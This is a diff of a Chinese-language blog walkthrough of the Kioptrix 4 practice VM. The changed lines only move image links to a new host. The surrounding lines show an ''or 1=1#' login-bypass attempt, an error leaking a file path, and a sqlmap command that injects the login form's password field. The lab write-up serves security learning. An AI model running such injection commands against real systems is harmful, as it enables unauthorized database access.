@@ -8,11 +8,11 @@
 <li>445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)</li>
 </ul>
 <p>访问80端口下的WEB服务。</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix4_1.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix4_1.png" alt=""></p>
 <p>尝试万能密码绕过<code>&#39;or 1=1#</code> 绕过失败。</p>
 <p>弱密码<code>admin:admin</code>也是错误的。</p>
 <p>尝试<code>admin:&#39;</code>，出现报错。好爆出来了路径<code>/var/www/checklogin.php</code>。</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix4_2.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix4_2.png" alt=""></p>
 <p>存在POST型注入。</p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="sqlmap进行SQL注入"><a href="#sqlmap进行SQL注入" class="headerlink" title="sqlmap进行SQL注入"></a>sqlmap进行SQL注入</h3><p><code>sqlmap -u http://10.32.58.187/checklogin.php --data=&quot;myusername=admin&amp;mypassword=123&amp;Submit=Login&quot; -p mypassword --current-user --current-db --is-dba</code></p>
 <p>在注入的过程会遇到<code>302跳转</code>选择<code>n</code>。</p>
